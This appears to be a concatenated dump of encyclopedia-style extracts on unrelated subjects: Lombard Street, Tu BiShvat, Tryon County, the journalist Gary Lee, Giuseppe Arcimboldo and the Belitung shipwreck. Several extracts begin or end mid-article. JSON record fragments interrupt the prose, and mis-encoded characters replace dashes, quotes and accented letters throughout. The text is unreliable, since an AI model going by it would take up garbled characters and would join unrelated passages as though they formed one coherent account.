Cannon Street to the south. Running north are Pope's Head Alley, Change Alley, Birchin Lane and George Yard. Heading south are St Swithin's Lane, Post Office Court, Abchurch Lane, Nicholas Lane, Clement's Lane and Plough Court. History Church of St Edmund, King and Martyr Lombard Street has its origins in one of the main Roman roads of Londinium. It later formed a plot of land granted by King Edward I (1272‚Äì1307) to goldsmiths from the part of northern Italy known as Lombardy (larger than the modern Lombardy region). In 1537 Sir Richard Gresham suggested to Lord Privy Seal, Thomas Cromwell that they \\"make a goodely Bursse in Lombert- streete, for marchuants to repayer unto\\". From this originated the Royal Exchange built by Sir Richard's son, Thomas. Blue plaque marking the location of Lloyd's Coffee House, notable in the development of the City's insurance market Lloyd's Coffee House, which eventually became the global insurance market Lloyd's of London, moved to Lombard Street near the General Post Office from Tower Street in 1691. The location, on the south side of the street, is now occupied at street level by a supermarket. Lloyd's is now located in Lime Street, where its current building was completed in 1986. Until the 1980s, most UK-based banks had their head offices in Lombard Street and historically it has been the London home for money lenders. No. 54 was the long-standing headquarters of Barclays before the financial institution moved in 2005 to One Churchill Place at Canary Wharf. No. 71 was the headquarters of Lloyds Bank, and No. 60 was the headquarters of the Trustee Savings Bank (TSB). Lombard Street has a number of colourful signs hanging from the buildings, depicting (mostly historic) organisations and buildings once located there. Having previously been banned, the present-day signs were erected for the coronation of Edward VII in 1902. From 1678 to 1829, the General Post Office had its headquarters on Lombard Street; this is now commemorated by the side-street's name of Post Office Court. The expense of continuously expanding the post office site in the middle of the financial district, however, eventually necessitated a move to St Martins-le-Grand. The slums at the site were cleared in the early 19th century and the General Post Office East was constructed.Postal Heritage. \\"The General Post Office East: 1829‚Äì1912\\". Accessed 2 October 2013. =Churches= St Mary Woolnoth is situated on the corner of Lombard Street and King William Street, and continues to be an active parish church. The City & South London Railway had obtained permission to demolish the 18th-century church and build a station (originally proposed to be named \\"Lombard Street\\") on the site. After public protest, the company changed its plans to build only a sub-surface ticket hall and lift entrance in the crypt of the church. This necessitated moving the bodies elsewhere, strengthening the crypt with a steel framework and underpinning the church's foundations. The church of St Edmund, King and Martyr also stands on the street, on the north side close to Gracechurch Street. Destroyed during the Great Fire of London in 1666, St Edmund's was rebuilt during the 1670s by Christopher Wren. It is no longer used for regular worship, though, and now performs service as the London Centre for Spirituality. A third church existed, until its demolition in 1937, near the junction of Gracechurch Street, known as All Hallows Lombard Street. The site now forms part of the plot occupied by the former Barclays bank. Ball Alley (which also no longer exists) connected the church with Lombard Street and George Yard. =Wards= Historically, Lombard Street was one of the principal streets (along with Fenchurch Street) of the ward of Langbourn, forming the core of the ward's West division. Boundary changes in 2003 and 2013 have resulted in most of the northern side remaining in Langbourn, whilst the southern side is now largely in the ward of Candlewick. The changes of 2013 now mean that all of the southern side of the street, with the notable exception of the guild‚Äî or ward‚Äîchurch of St Mary Woolnoth, is in Candlewick (from 2003 to 2013 Candlewick extended only to Abchurch Lane). Also with the 2013 changes, the ward of Walbrook now includes the northern side from No. 68 to Bank junction. Prior to 2003 and again since 2013 Walbrook includes the far western corner of Lombard Street, on the corner with Mansion House Place. Language and literature In old literature, it is generally written as \\"Lombard-street\\". The spacing and the capitalisation of Street were not common in British English until the second half of the 20th century. In his diary of the 1660s, Samuel Pepys mentions \\"Lumbard street\\" many times; there is a chart with links to these references.https://www.pepysdiary.com/encyclopedia/966/ \\"All Lombard Street to a China orange\\" is an old-fashioned idiom meaning very heavily weighted odds; \\"Lombard-street\\" signifying wealth and \\"a China orange\\", poverty.

Bagehot was one of the first writers to describe and explain the world of international and corporate finance, banking, and money in understandable language. The book was in part a reaction to the 1866 collapse of Overend, Gurney and Company, a bank headquartered at No. 65, Lombard Street. Karl Marx mentions Lombard Street in reference to credit and banking in Das Kapital. People Gregory de Rokesley, eight-times Lord Mayor of London from 1274 to 1281 and in 1285, lived in a building on the site of what is now No. 72 Lombard Street, and in Pope's Head Alley.

It is also called Rosh HaShanah La'Ilanot (), literally 'New Year of the Trees'. In contemporary Israel, the day is celebrated as an ecological awareness day, and trees are planted in celebration. Etymology The name Tu BiShvat is derived from the Hebrew date of the holiday, which occurs on the fifteenth day of Shevat. \\"Tu\\" stands for the Hebrew letters Tet and Vav, which together have the numerical value of 9 and 6, adding up to 15.When representing the number using letters, rabbinic rules forbid using the letter-numerals that represent 10 ( Yud) and 5 ( Hei) together because they form the abbreviation of the \\"ineffable name of God\\", YHVH . Therefore, the number 15 is represented by the letters (Tet) and (Vav), or 9 and 6 = 15. The date may also be called \\"·∏§amisha Asar BiShvat\\" (, \\"Fifteenth of Shevat\\").Tractate Rosh Hashannah Mishnah 1:1  Talmud  Tu BiShvat appears in the Mishnah in Tractate Rosh Hashanah as one of the four new years in the Jewish calendar. The discussion of when the New Year occurs was a source of debate among the rabbis, who argued: * The first of Nisan is the \\"new year for kings and festivals\\". * The first of Elul is the \\"new year for the tithe of cattle\\"; Rabbi Eleazar and Rabbi Shimon, however, place this on the first of Tishrei. * The first of Tishrei is the \\"new year for years\\" (calculation of the calendar), \\"for release years\\" (sabbatical years), jubilees, planting, and for the tithe of vegetables. * The first of Shevat is the \\"new year for trees\\" according to the school of Shammai; the school of Hillel, however, place this on the fifteenth of Shevat. The rabbis ruled in favor of Hillel on this issue and the 15th of Shevat became the date for calculating the beginning of the agricultural cycle for the purpose of biblical tithes. Biblical tithesOrlah refers to a biblical prohibition (Leviticus 19:23) on eating the fruit of trees produced during the first three years after they are planted. *Neta Reva'i refers to the biblical commandment (Leviticus 19:24) to bring fourth-year fruit crops to Jerusalem as a tithe. *Maaser Sheni was a tithe which was collected in Jerusalem and Maaser Ani was a tithe given to the poor (Deuteronomy 14:22‚Äì29) that were also calculated by whether the fruit ripened before or after Tu BiShvat. Of the talmudic requirements for fruit trees which used Tu BiShvat as the cut-off date in the Hebrew calendar for calculating the age of a fruit-bearing tree, Orlah remains to this day in essentially the same form it had in talmudic times. In the Orthodox Jewish world, these practices are still observed today as part of Halacha, Jewish law. Fruit that ripened on a three-year-old tree before Tu BiShvat is considered orlah and is forbidden to eat, while fruit ripening on or after Tu BiShvat of the tree's third year is permitted. In the 1st, 2nd, 4th and 5th years of the Shmita cycle Maaser Sheni is observed today by a ceremony redeeming tithing obligations with a coin; in the 3rd and 6th years, Maaser Ani is substituted, and no coin is needed for redeeming it. Tu BiShvat is the cut-off date for determining to which year the tithes belong. Tu BiShvat falls on the 15th day of the Hebrew month of Shevat and begins a three-month series (in years without a leap year) of holidays that occur on the mid-month full moons that culminate in Passover. Kabbalistic and Hasidic customs Dried fruit and almonds traditionally eaten on Tu BiShvat In the Middle Ages, Tu BiShvat was celebrated with a feast of fruits in keeping with the Mishnaic description of the holiday as a \\"New Year.\\" In the 16th century, the kabbalist Rabbi Yitzchak Luria of Safed and his disciples instituted a Tu BiShvat seder in which the fruits and trees of the Land of Israel were given symbolic meaning. The main idea was that eating ten specific fruits and drinking four cups of wine in a specific order while reciting the appropriate blessings would bring human beings, and the world, closer to spiritual perfection. In Israel, the kabbalistic Tu BiShvat seder has been revived, and is now celebrated by many Jews, religious and secular. Special haggadot have been written for this purpose. In the Hasidic community, some Jews pickle or candy the etrog (citron) from Sukkot and eat it on Tu BiShvat. Some pray that they will be worthy of a beautiful etrog on the following Sukkot. Customs in Israel Tu BiShvat is the Israeli Arbor Day, and it is often referred to by that name in international media. Ecological organizations in Israel and the diaspora have adopted the holiday to further environmental-awareness programs. On Israeli kibbutzim, Tu BiShvat is celebrated as an agricultural holiday. On Tu BiShvat 1890, Rabbi Ze'ev Yavetz, one of the founders of the Mizrachi movement, took his students to plant trees in the agricultural colony of Zichron Yaakov. This custom was adopted in 1908 by the Jewish Teachers Union and later by the Jewish National Fund (Keren HaKayemet L‚ÄôIsrael), established in 1901 to oversee land reclamation and afforestation of the Land of Israel. In the early 20th century, the Jewish National Fund devoted the day to planting eucalyptus trees to stop the plague of malaria in the Hula Valley; today the Fund schedules major tree-planting events in large forests every Tu BiShvat. Over a million Israelis take part in the Jewish National Fund's Tu BiShvat tree-planting activities. In keeping with the idea of Tu BiShvat marking the revival of nature, many of Israel's major institutions have chosen this day for their inauguration. The cornerstone-laying of the Hebrew University of Jerusalem took place on Tu BiShvat 1918; the Technion in Haifa, on Tu BiShvat 1925; and the Knesset, on Tu BiShvat 1949.

Its eastern boundary with the also-new Charlotte County ran \\"from the Mohawk River to the Canada line, at a point near the old village of St. Regis and passing south to the Mohawk between Schenectady and Albany.\\" It extended north to the St. Lawrence River; its western boundary was the Treaty of Fort Stanwix's Line of Property, following the Unadilla River, Oneida Lake, Onondaga River and Oswego River to Lake Ontario, as the Iroquois Confederacy still controlled locations further west in the Indian Reserve. Tryon County's seat was Johnstown, which is today the county seat of Fulton County.Anderson, p. 67 The Tryon County Courthouse, built in 1772‚Äì1773, was listed on the National Register of Historic Places in 1972. The Tryon County Jail, also built in 1772‚Äì1773, was listed on the National Register of Historic Places in 1981. The county was divided into five districts: Mohawk, Palatine, Canajohorie, German Flatts, and Kingsland. The county court house and jail were erected in Johnstown in 1772 establishing Johnstown as the county seat. Three of the seven original judges were relatives of Sir William Johnson: Sir John Johnson (son), Guy Johnson (nephew), and Daniel Claus (son-in-law) with a fourth judge being close business associate and neighbour, Colonel John Butler. The remainder of the original seven judges were Peter Conyne, Jelles Fonda and John Wells. Guy Johnson, John Johnson, Daniel Claus and John Butler sided with Britain during the American Revolution while Fonda, Wells and Conyne supported the American cause. Its members in the Province of New York assembly were Sir John Johnson and Hendrick Frey. American Revolution In August, 1774, shortly before the outbreak of the American Revolution, some members of the county formed the Tryon County Committee of Safety to harass their Loyalist neighbors, eventually causing many to flee to the safety of Canada. Guy Johnson and a large party of supporters left in May, 1775. Sir John Johnson and a large party of his supporters left in May, 1776. By 1776, most of the Loyalists in Tryon County had fled. In December 1780, the results of a census stated that the number of uncultivated farms was 1200 and that 354 families had abandoned and had fled the county. In some places such as Cherry Valley, Springfield, and Harpersfield there was no one to conduct a census. This was out of a pre-war population of around 10,000. Schenectady came near to being the limit of civilization. After the war On April 2, 1784 the new state's legislature voted to change the name to Montgomery County, in honor of General Richard Montgomery, a Continental Army General slain during the Battle of Quebec. The Legislature stated, ‚ÄúFrom and after the passing of this act, the county of Tryon shall be called and known by the name of Montgomery, and the county of Charlotte by the name of Washington.‚ÄùSylvester, p. 12 See also For the history of Tryon County prior to 1772 see Albany County, New York * For the history of Tryon County after 1784 see Montgomery County, New York *List of New York counties *List of former United States counties References Bibliography * External linksHistory of Tryon County, NY *History of Tryon County, NY Former counties of the United States Pre-statehood history of New York (state) History of the Thirteen Colonies New York (state) counties ","title":"Tryon County, New York"},{"id":"30876020","title":"Amon G√∂th"},{"id":"30876027","text":"Gary Lee is an American journalist with a focus on foreign policy, travel writing and environmental issues. He wrote for the Washington Post as well as Time Magazine. He speaks five languages including Russian German, French and Spanish, and he was the Washington Post's Moscow Bureau Chief. He was twice nominated for the Pulitzer Prize for foreign coverage and won the Lowell Thomas Award for travel journalism for his coverage of 9/11. He was elected to the position of charter trustee at Phillips Academy in 2009. In 2007, he left the Washington Post to become a freelance journalist. Education Lee grew up in Tulsa, Oklahoma, the fourth child in a family of eleven. He attended Phillips Academy in Andover, Massachusetts between 1970 and '74. His studies there centered on English literature and modern languages. He began his reporting career at Andover as a writer for The Phillipian, the campus newspaper, and general manager of WPAA, the school's radio station. Lee, in a later interview with travel writer Ross Potts, thought that his parents realized that he had a wanderlust and urge to explore the world. Lee graduated from Andover in 1974, the school's first co-educational class; among his classmates were many future writers, including poets Chris Agee and Karl Kirchwey, writer Nate Lee, publisher and activist Ted Nace, editor Sara Nelson, and political analyst and writer Heather Mac Donald. Lee completed his secondary school education in studies at Uppingham School, a private academy in Rutland County, England. Lee attended Amherst College and graduated cum laude in 1979, with a double major in Russian language and Development Studies with particular interest in Africa. He was editor in chief of the Amherst Student, the campus newspaper, an avid track runner, and dj of a jazz radio program. Career In his early career, Lee worked at Time Magazine first as a writer focusing on the environment and later as a correspondent in the magazine's bureau in Germany. In 1984, he was hired by the Washington Post and became the paper's bureau chief in Moscow from 1985-1989. There he led the coverage of the era of then Soviet leader Mikhail Gorbachev and the collapse of the Soviet Union. In a later interview, he described the experience as both \\"brutal and exhilarating\\" since it forced him to \\"bang out long pieces on deadline almost daily\\". Lee also covered Congress and served as the Post's National Environmental writer. Later, he became a travel writer for the Post specializing in eco tourism, and cultural travel issues. According to Lee's own accounting, he has written about more than 80 countries, stayed in over a thousand hotels, motels, and bed and breakfasts on assignments. He has camped out near the Potomac River as well as taken the Trans-Siberian railway in Russia. In his reporting, Lee advised travelers on such matters as getting around Moscow, ecologically correct hotels, safety on cruise ships, travel to Canada, dining options, avoiding hurricanes in the Caribbean, tipping customs, private tour guides, and many other travel-related matters. Since 2007, Lee has written articles on sociological travel trends and environmental issues for several national magazines. Lee was interviewed by travel writer Rolf Potts who assembled a collection of \\"globe-trotting authors\\", including Lee in his blog \\"Rolf Potts' Vagabonding Blog\\". Lee advises would-be travel writers to learn a foreign language to help one \\"gain insight into how another culture ticks.\\" In an interview, Lee described his approach to travel writing: According to the Washington Post, he loves \\"exotic digestibles\\" such as \\"mare's milk in Mongolia.\\" In addition to his writing, Lee is co-founder and co-owner of Las Canteras Restaurant, voted the top Latin restaurant in Washington, D.C. in 2011 and 2012. He is also helped to start and is co-owner and marketing director of Casa Arequipa, a boutique hotel in Arequipa, Peru cited by Tripadvisor as one of the top 25 hotels in South America in 2012.

These works form a distinct category from his other productions. He was a conventional court painter of portraits for three Holy Roman emperors in Vienna and Prague, also producing religious subjects and, among other things, a series of coloured drawings of exotic animals in the imperial menagerie. He specialized in grotesque symbolical compositions of fruits, animals, landscapes, or various inanimate objects arranged into human forms. The still- life portraits were clearly partly intended as whimsical curiosities to amuse the court, but critics have speculated as to how seriously they engaged with Renaissance Neo-Platonism or other intellectual currents of the day. Biography Vertumnus, a portrait depicting Rudolf II, Holy Roman Emperor painted as Vertumnus, the Roman god of the seasons, c. 1590‚Äì91. Skokloster Castle, Sweden. Four Seasons in One Head, c. 1590, National Gallery of Art, U.S. Giuseppe's father, Biagio Arcimboldo, was an artist of Milan. Like his father, Giuseppe Arcimboldo started his career as a designer for stained glass and frescoes at local cathedrals when he was 21 years old. In 1562, he became court portraitist to Ferdinand I at the Habsburg court in Vienna, Austria and later, to Maximilian II and his son Rudolf II at the court in Prague. He was also the court decorator and costume designer. Augustus, Elector of Saxony, who visited Vienna in 1570 and 1573, saw Arcimboldo's work and commissioned a copy of his The Four Seasons which incorporates his own monarchic symbols. Arcimboldo's conventional work, on traditional religious subjects, has fallen into oblivion, but his portraits of human heads made up of vegetables, plants, fruits, sea creatures and tree roots, were greatly admired by his contemporaries and remain a source of fascination today. At a distance, his portraits looked like normal human portraits. However, individual objects in each portrait were actually overlapped together to make various anatomical shapes of a human. They were carefully constructed by his imagination. The assembled objects in each portrait were not random: each was related by characterization.Maiorino, Giancarlo. The Portrait of Eccentricity: Arcimboldo and the Mannerist Grotesque. The Pennsylvania State University Press, 1991. Print. In the portrait now represented by several copies called The Librarian, Arcimboldo used objects that signified the book culture at that time, such as the curtain that created individual study rooms in a library. The animal tails, which became the beard of the portrait, were used as dusters. By using everyday objects, the portraits were decoration and still-life paintings at the same time.Elhard, K. C. \\"Reopening the Book on Arcimboldo‚Äôs Librarian.\\" Libraries & Culture 40.2 Spring 2005. 115‚Äì127. Project MUSE. His works showed not only nature and human beings, but also how closely they were related. After a portrait was released to the public, some scholars, who had a close relationship with the book culture at that time, argued that the portrait ridiculed their scholarship. In fact, Arcimboldo criticized rich people's misbehavior and showed others what happened at that time through his art. In The Librarian, although the painting might have appeared ridiculous, it also contained a criticism of wealthy people who collected books only to own them, rather than to read them. Art critics debate whether his paintings were whimsical or the product of a deranged mind. A majority of scholars hold to the view, however, that given the Renaissance fascination with riddles, puzzles, and the bizarre (see, for example, the grotesque heads of Leonardo da Vinci), Arcimboldo, far from being mentally imbalanced, catered to the taste of his times. Arcimboldo died in Milan, where he had retired after leaving the Prague service. It was during this last phase of his career that he produced the composite portrait of Rudolph II (see above), as well as his self-portrait as the Four Seasons. His Italian contemporaries honored him with poetry and manuscripts celebrating his illustrious career. When the Swedish army invaded Prague in 1648, during the Thirty Years' War, many of Arcimboldo's paintings were taken from Rudolf II's collection. His works can be found in Vienna's Kunsthistorisches Museum and the Habsburg Schloss Ambras in Innsbruck; the Louvre in Paris; as well as in numerous museums in Sweden. In Italy, his work is in Cremona, Brescia, and the Uffizi Gallery in Florence. The Wadsworth Atheneum in Hartford, Connecticut; the Denver Art Museum in Denver, Colorado; the Menil Foundation in Houston, Texas; the Candie Museum in Guernsey and the Real Academia de Bellas Artes de San Fernando in Madrid also own paintings by Arcimboldo. He is known as a 16th-century Mannerist. A transitional period from 1520 to 1590, Mannerism adopted some artistic elements from the High Renaissance and influenced other elements in the Baroque period. A Mannerist tended to show close relationships between human and nature. Arcimboldo also tried to show his appreciation of nature through his portraits. In The Spring, the human portrait was composed of only various spring flowers and plants. From the hat to the neck, every part of the portrait, even the lips and nose, was composed of flowers, while the body was composed of plants. On the other hand, in The Winter, the human was composed mostly of roots of trees. Some leaves from evergreen trees and the branches of other trees became hair, while a straw mat became the costume of the human portrait. Legacy In 1976, the Spanish sculptor Miguel Berrocal created the original bronze sculpture interlocking in 20 elements titled Opus 144 ARCIMBOLDO BIG as a homage to the Italian painter. This work was followed by the limited-edition sculpture in 1000 copies titled Opus 167 OMAGGIO AD ARCIMBOLDO (HOMAGE TO ARCIMBOLDO) of 1976‚Äì1979 consisting of 30 interlocking elements. The works of Arcimboldo, especially his multiple images and visual puns, were rediscovered in the early 20th century by Surrealist artists such as Salvador Dal√≠. The exhibition entitled \\"The Arcimboldo Effect: Transformations of the face from the 16th to the 20th Century‚Äù at the Palazzo Grassi in Venice (1987) includes numerous 'double meaning' paintings. Arcimboldo's influence can also be seen in the work of Shigeo Fukuda, Istv√°n Orosz, Octavio Ocampo, Vic Muniz, and Sandro del Prete, as well as the films of Jan ≈†vankmajer.[Literature:The Arcimboldo Effect: Transformations of the face from the 16th to the 20th Century. Abbeville Press, New York, 1st Edition (September 1987). . .] Arcimboldo's works are used by some psychologists and neuroscientists to determine the presence of lesions in the hemispheres of the brain that recognize global and local images and objects. Art heritage, estimates =Heritage= A 1813 Puzzle Picture of Napoleon, in the same style like Giuseppe Arcimboldo, hand- colored etching, in the Cooper Hewitt, Smithsonian Design Museum (New York City) Giuseppe Arcimboldo did not leave written certificates on himself or his artwork. After the deaths of Arcimboldo and his patron‚Äîthe emperor Rudolph II‚Äîthe heritage of the artist was quickly forgotten, and many of his works were lost. They were not mentioned in the literature of the 17th and 18th centuries. Only in 1885 did the art critic K. Kasati publish the monograph \\"Giuseppe Arcimboldi, Milan Artist\\" in which the main attention was given to Arcimboldi's role as a portraitist.Werner Kriegeskorte (2000). Arcimboldo. Ediz. Inglese. Taschen. p. 30. With the advent of surrealism its theorists paid attention to the formal work of Arcimboldo, and in the first half of the 20th century many articles were devoted to his heritage. Gustav Hocke [de] drew parallels between Arcimboldo, Salvador Dal√≠, and Max Ernst's works. A volume monograph of B. Geyger and the book by F. Legrand and F. Xu were published in 1954. Since 1978 T. DaCosta Kaufmann was engaged in Arcimboldo's heritage, and wrote of the artist defending his dissertation \\"Variations on an imperial subject\\". His volume work, published in 2009, summed up the attitude of modern art critics towards Arcimboldo. An article published in 1980 by Roland Barthes was devoted to Arcimboldo's works. Archimboldo's relation with surrealism was emphasized at landmark exhibitions in New York (\\"Fantastic art, dada, surrealism\\", 1937) and in Venice (\\"Arcimboldo's Effect: Evolution of the person in painting from the XVI century\\", Palazzo Grassi, 1987) where Arcimboldo's allegories were presented. The largest encyclopedic exhibition of Arcimboldo's heritage, where about 150 of his works were presented, including graphics, was held in Vienna in 2008. In spite of the fact that very few works of Arcimboldo are available in the art market, their auction cost is in the range of five to 10 million dollars. Experts note that it is very modest for an artist at such a level of popularity. Arcimboldo's art heritage is badly identified, especially as it concerns his early works and pictures in traditional style. In total about 20 of his pictures remain, but many more have been lost, according to mentions of his contemporaries and documents of the era. His cycles Four Elements and Seasons, which the artist repeated with little changes, are most known. Some of his paintings include The Librarian, The Jurist, The Cook, Cupbearer, and other pictures.Werner Kriegeskorte (2000). Arcimboldo. Ediz. Inglese. Taschen. p. 16‚Äî20. Arcimboldo's works are stored in the state museums and private collections of Italy (including Uffizi Gallery), France (Louvre), Austria, the Czech Republic, Sweden, and in the US. =Art interpretations= The main object of modern art critics' interpretation are the \\"curious\\" paintings of Arcimboldo whose works, according to V. Krigeskort, \\"are absolutely unique\\".Werner Kriegeskorte (2000). Arcimboldo. Ediz. Inglese. Taschen. p. 20. Attempts of interpretation begin with judgments of the cultural background and philosophy of the artist, however a consensus in this respect is not developed. B. Geyger, who for the first time raised these questions, relied mainly on judgments of contemporaries‚ÄîLomazzo, Comanini, and Morigia, who used the terms \\"scherzi, grilli, and capricci\\" (respectively, \\"jokes\\", \\"whims\\", \\"caprices\\"). Geyger's monograph is entitled: \\"Comic pictures of Giuseppe Arcimboldo\\". Geyger considered the works of the artist as inversion, when the ugliness seems beautiful, or, on the contrary, as the disgrace exceeding the beauty, entertaining the regal customer.Werner Kriegeskorte (2000). Arcimboldo. Ediz. Inglese. Taschen. pp. 32‚Äì34. A similar point of view was stated by Barthes, but he reduced works of the artist to the theory of language, believing that fundamentals of Arcimboldo's art philosophy is linguistic, because without creating new signs he confused them by mixing and combining elements that then played a role in the innovation of language.Roland Barthes. Arcimboldo. p. 335 > Arcimboldo speaks double language, at the same time obvious and obfuscatory; > he creates \\"mumbling\\" and \\"gibberish\\", but these inventions remain quite > rational. Generally, the only whim (bizarrerie) which isn't afforded by > Arcimboldo ‚Äì he doesn't create language absolutely unclear ‚Ä¶ his art not > madly.Roland Barthes. Arcimboldo. p. 338 Arcimboldo's classification as mannerist also belongs to the 20th century. Its justification contains in Gustav Rehn Hok's work The world as a Labyrinth, published in 1957. Arcimboldo was born in the late Renaissance, and his first works were done in a traditional Renaissance manner. In Hok's opinion, during the Renaissance era the artist had to be first of all the talented handicraftsman who skillfully imitated the nature, as the idea of fine art was based on its studying. Mannerism differed from the Renaissance art in attraction to \\"not naturalistic abstraction\\". It was a continuation of artistic innovation in the late Middle Ages‚Äîart embodying ideas. According to G. Hok, in consciousness there is concetto‚Äîthe concept of a picture or a picture of the concept, an intellectual prototype. Arcimboldo, making a start from concetti, painted metaphorical and fantastic pictures, extremely typical for manneristic art.Werner Kriegeskorte (2000). Arcimboldo. Ediz. Inglese. Taschen. pp. 56‚Äì58. In On Ugliness, which was published under Umberto Eco's edition, Arcimboldo also admitted belonging to manneristic tradition for which \\"...the preference for aspiration to strange, extravagant and shapeless over expressional fine\\" is peculiar.Storia della bruttezza (Bompiani, 2007 ‚Äì English translation: On Ugliness, 2007). p.169 In the work Arcimboldo and archimboldesk, F. Legrand and F. Xu tried to reconstruct philosophical views of the artist. They came to a conclusion that the views represented a kind of Platonic pantheism. The key to reconstruction of Arcimboldo's outlook seemed to them to be in the symbolism of court celebrations staged by the artist, and in his allegorical series. According to Plato's dialogues \\"Timaeus\\", an immemorial god created the Universe from chaos by a combination of four elements ‚Äì fire, water, air and the earth, as defines all-encompassing unity.Werner Kriegeskorte (2000). Arcimboldo. Ediz. Inglese. Taschen. pp. 58‚Äì60. In T. Dakosta Kauffman's works serious interpretation of heritage of Arcimboldo in the context of culture of the 16th century is carried out consistently. Kauffman in general was skeptical about attribution of works by Arcimboldo, and recognized as undoubted originals only four pictures, those with a signature of the artist. He based the interpretation on the text of the unpublished poem by J. Fonteo \\"The picture Seasons and Four Elements of the imperial artist Giuseppe Arcimboldo\\". According to Fonteo, the allegorical cycles of Arcimboldo transfer ideas of greatness of the emperor. The harmony in which fruits and animals are combined into images of the human head symbolizes harmony of the empire under the good board of the Habsburgs. Images of seasons and elements are always presented in profile, but thus Winter and Water, Spring and Air, Summer and Fire, Fall and Earth are turned to each other. In each cycle symmetry is also observed: two heads look to the right, and two ‚Äî to the left. Seasons alternate in an invariable order, symbolizing both constancy of the nature and eternity of board of the Habsburgs' house. The political symbolics also hints at it: at the image of Air there are Habsburg symbols ‚Äî a peacock and an eagle and Fire is decorated with a chain of the Award of the Golden Fleece, a great master of which by tradition was a head of a reigning dynasty. However it is made of flints and shod steel. Guns also point to the aggressive beginning. The Habsburg symbolics is present in the picture Earth, where the lion's skin designates a heraldic sign of Bohemia. Pearls and corals similar to cervine horns in Water hint at the same. Werner Kriegeskorte (2000). Arcimboldo. Ediz. Inglese. Taschen. p. 44. In literature and popular culture A number of writers from seventeenth-century Spain allude to his work, given that Philip II had acquired some of Arcimboldo's paintings. Grotesque images in the Miguel de Cervantes novel Don Quixote, such as an immense fake nose, recall his work. Frederick A. de Armas, \\"Nero's Golden House: Italian Art and the Grotesque in Don Quijote, Part II,\\" Cervantes: Bulletin of the Cervantes Society of America 24.1 (2004): 143-71. He also appears in the works of Francisco de Quevedo. Margarita Levisi,\\"Las figuras compuestas en Arcimboldo y Quevedo,\\" Comparative Literature20 (1968): 217-35. Turning to contemporary Latin American literature, he appears in Roberto Bola√±o's 2666, in which the author uses the painter's name for one of the main characters, Benno von Archimboldi. Arcimboldo's painting Water was used as the cover of the 1975 album Masque by the progressive rock band Kansas, and was also shown on the cover of the 1977 Paladin edition of Thomas Szasz's The Myth of Mental Illness.See the 1977 Paladin edition of The Myth of Mental Illness The 1992 novelette The Coming of Vertumnus by Ian Watson counterpoints the innate surrealism of the eponymous work against a drug-induced altered mental state. In Harry Turtledove's 1993 fantasy detective novel, The Case of the Toxic Spell Dump, the alternate history's version of Arcimboldo incorporated imps ‚Äì a common, everyday sight in that world ‚Äì along with fruit, books, etc., into his iconic portraits. The logo of the Arkangel Shakespeare audiobooks, released from 1998 onwards, is a portrait of William Shakespeare made out of books, in the style of Arcimboldo's Librarian. Arcimboldo-style fruit people appear as characters in the films The Tale of Despereaux (2008) and Alice Through the Looking Glass (2016), as well as in the Cosmic Osmo video game series. Arcimboldo's surrealist imagination is visible also in fiction. The first and last sections of 2666 (2008), Roberto Bola√±o's last novel, concern a fictional German writer named Archimboldi, who takes his pseudonym from Arcimboldo.Bola√±o, Roberto. 2666.

The ship completed the outward journey, but sank on the return journey, approximately off the coast of Belitung Island, Indonesia. It is unclear why the ship was so far from its expected route back from China. Belitung is to the south-east of the Singapore Strait by , and this secondary route is more normal for ships travelling from the Java Sea, which is south of Belitung Island. The wreck has given archaeologists two major discoveries: the biggest single collection of Tang dynasty artefacts found in one location, the so-called \\"Tang Treasure\\"; and the Arabian dhow, which gives a new insight into the trade routes between China and the Middle East during that period. The treasure has been kept as one collection and, during the excavation, the efforts to preserve the integrity of the site and its cargo have resulted in detailed archaeological evidence. This evidence has given new insight into the construction methods used in shipbuilding, and the items and style of artefacts has revealed previously unknown facts about the trade between the two areas. Discovery and route Map of the Middle East and Asia showing the expected route of the ship in red, a green box highlighting Belitung Island and Oman coloured in blue (click to enlarge) =Discovery= The wreck was discovered by fishermen in 1998 in the Gelasa Strait in of water. The site location was purchased from local fishermen and a license to engage in excavation was awarded to a local Indonesian company. The dig was subsequently financed and excavated by Tilman Walterfang and his team at Seabed Explorations, under a license of co-operation with the original salvage company, and after a request from the Indonesian Government; security was provided by the Indonesian Navy. The excavations spanned two expeditions, one which commenced in August 1998 and the second in 1999. Seabed Explorations provided vessels and financed government naval operations to safeguard the wreck site before and during the monsoon season. =Route= It is unclear why the ship was so far from its expected route (shown in red on the map to the right), as most ships leaving China for Arabia would have sailed through the South China Sea. They would then turn north-west after passing southern Vietnam, continuing through the Singapore Strait into the Straits of Malacca between Peninsular Malaysia and Sumatra. Belitung is some distance from this route, and it is unclear how the vessel came to be in this area. Belitung is to the south-east of the Singapore Strait by , and this secondary route is more normal for ships travelling from the Java Sea, which is south of Belitung Island, to the Strait of Malacca north of the Island. Ship and construction The shipwreck is of a dhow similar in size and construction to this one, in Oman The shipwrecked dhow was approximately wide and long and is remarkable for two reasons; it is the first ancient Arabian ship to be found and excavated, and its planks were sewn together using a thin rope made of coconut fibres rather than using the more traditional methods of pegs or nails used in Arabia in later centuries. The wreck timbers were found under a sediment that preserved the remains of the wooden vessel, without which the wreck would have been lost due to marine worms. Wrecks of this age are rare finds and this particular one was in such a good condition that much of the hull was preserved. This has given us an insight into how ships of this period were constructed‚Äîsomething which has not been seen before as no Arabian ship of this type had previously been found, nor any with their cargo intact. Pieces of the original timbers were preserved enough to allow scientists to analyse them and determine some of the types of wood used. It is possible that the ship was constructed in western Asia and bought by Arabian merchants to be used for the Oman to China route; the cargo contains many Arabian-inspired artefacts. =Construction techniques= The ship was constructed around a long keel of thickness, which is believed to have survived intact. The front of the ship had a 61¬∞ angle of rake at the bow where the stem post was joined to the keel with mortise and tenon joints and secured with diameter rope. The hull planks were stitched onto the frames and keel through holes spaced at intervals. The boat had a keelson for added strength, which rested on the half-frames. Michael Flecker, the chief excavating archaeologist at the site, compared the wrecked ship to three types of the same period and concluded that the wreck most resembled \\"lashed-lug\\" ships of south-east Asia‚Äîfirst used in the 5th century. He said that fully stitched boats were found from the African coast, Oman, in the Red Sea, on the Indian coast, and as far as the Maldives. He notes that Roman references by Procopius in the 6th century tell of boats with planks stitched together in a similar fashion used in \\"Indian Seas\\". Though Arabian ships of this type have not been found before, they are mentioned in text including the late-Tang Ling biao lu yi (\\"Strange Things Noted in the South\\"). According to John Guy, curator of the Metropolitan Museum of Art, the book \\"describes the ships of foreign merchants as being stitched together with the fiber of coir-palms and having their seams caulked rather than using iron nails to secure their planks\\". =Wood types= Samples of wood from the shipwreck were sent for analysis at the Forest and Forest Products division of the Commonwealth Scientific and Industrial Research Organisation (CSIRO) in Australia. The analysis was conducted by Jugo Ilic 